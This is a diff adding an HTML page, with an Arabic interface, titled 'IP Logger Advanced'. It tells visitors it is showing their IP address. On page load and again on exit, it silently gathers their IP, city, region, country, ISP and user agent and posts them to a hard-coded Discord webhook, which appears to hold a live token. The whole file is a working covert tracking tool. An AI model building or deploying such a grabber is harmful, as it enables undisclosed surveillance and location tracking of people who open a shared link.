@@ -1,0 +1,100 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>IP Logger Advanced</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+body{
+    background:#0a0a0a;
+    color:#fff;
+    font-family:Arial, sans-serif;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+}
+.box{
+    background:#111;
+    border:2px solid #2a2a2a;
+    padding:30px 40px;
+    border-radius:14px;
+    text-align:center;
+}
+.ip{
+    margin-top:15px;
+    font-size:22px;
+    color:#00ffcc;
+}
+</style>
+</head>
+
+<body>
+<div class="box">
+    <h2>IP الخاص بك</h2>
+    <div class="ip" id="ip">جاري التحميل...</div>
+</div>
+
+<script>
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1457809018042187969/JTKxopUi61LAzbz5xrNRU9hZlOrtUFNcA0juwrby568eEUOEr--k6qX1CUk0cTLvKg3r"; // حطي هنا ويبهوكك
+const LOCAL_IP_KEY = "last_ip_logged";
+
+async function sendIP() {
+    try {
+        // جلب بيانات IP + الدولة + المدينة + المزود
+        const res = await fetch("https://ipinfo.io/json?token=7cbef6b831aeab");
+        const data = await res.json();
+        const ip = data.ip;
+        const city = data.city || "غير معروف";
+        const region = data.region || "غير معروف";
+        const country = data.country || "غير معروف";
+        const org = data.org || "غير معروف";
+
+        document.getElementById("ip").textContent = ip;
+
+        // تحقق إذا IP جديد
+        const lastIP = localStorage.getItem(LOCAL_IP_KEY);
+        let isNewIP = false;
+        if(lastIP !== ip){
+            isNewIP = true;
+            localStorage.setItem(LOCAL_IP_KEY, ip);
+        }
+
+        const payload = {
+            username: "IP Logger Advanced",
+            embeds: [{
+                title: `📡 IP تم تسجيله ${isNewIP ? "🚨 جديد" : ""}`,
+                color: isNewIP ? 0xff0000 : 0x00ffcc,
+                fields: [
+                    { name: "IP Address", value: `\`${ip}\``, inline: false },
+                    { name: "المدينة / المنطقة", value: `${city}, ${region}`, inline: false },
+                    { name: "الدولة", value: country, inline: false },
+                    { name: "مزود الإنترنت", value: org, inline: false },
+                    { name: "User Agent", value: navigator.userAgent, inline: false },
+                    { name: "الوقت", value: new Date().toLocaleString(), inline: false }
+                ],
+                footer: { text: "Advanced IP Logger" }
+            }]
+        };
+
+        await fetch(WEBHOOK_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+
+    } catch(e) {
+        document.getElementById("ip").textContent = "فشل جلب IP";
+        console.error(e);
+    }
+}
+
+// إرسال عند فتح الصفحة
+sendIP();
+
+// إرسال عند الخروج / تحديث الصفحة
+window.addEventListener("beforeunload", sendIP);
+</script>
+</body>
+</html>
